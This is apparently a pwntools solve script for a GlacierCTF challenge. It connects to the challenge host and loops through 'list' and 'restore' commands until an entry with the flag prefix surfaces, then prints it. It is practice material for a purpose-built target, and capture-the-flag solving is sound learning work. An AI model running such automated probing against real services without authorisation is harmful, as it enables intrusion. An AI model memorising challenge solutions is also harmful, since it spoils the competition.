from pwn import connect, log

FLAG_FORMAT = b'glacierctf'
def solve():
    # io = connect('127.0.0.1', 1337)
    io = connect('pwn.glacierctf.com', 13372)

    def send(payload):
        io.readuntil(b'> ')
        io.sendline(payload.encode())

    def getLines():
        send('list -l 100')
        lines = io.readlines(100)
        for line in lines[:3]:
            print(line.decode())
        print('-'*80)
        lines = [b' '.join(line.split(b' ')[1:]) for line in lines]
        return lines

    top_element_idx = 0
    while (True):
        lines = getLines()
        searching = lines[0]
        for current_index in range(1, len(lines)):
            if FLAG_FORMAT in lines[current_index]:
                send(f'restore -i {current_index}')
                send(f'list -l 1')
                full_flag = io.readline()
                log.success(full_flag.decode())
                return

        for current_index in range(1, len(lines)):
            if searching == lines[current_index]:
                send(f'restore -i {current_index}')
                continue

        top_element_idx = top_element_idx + 1 if top_element_idx < 100 else 1
        send(f'restore -i {top_element_idx}')

if __name__ == '__main__':
    solve()
